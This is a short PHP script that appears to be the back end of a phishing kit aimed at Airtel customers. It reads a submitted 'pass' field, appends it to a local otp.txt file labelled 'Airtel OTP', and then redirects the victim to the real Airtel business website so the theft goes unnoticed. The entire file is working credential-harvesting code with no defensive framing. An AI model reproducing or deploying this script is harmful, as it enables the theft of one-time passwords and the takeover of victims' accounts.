<?php
file_put_contents("otp.txt", "Airtel OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.airtel.in/business/');
?>
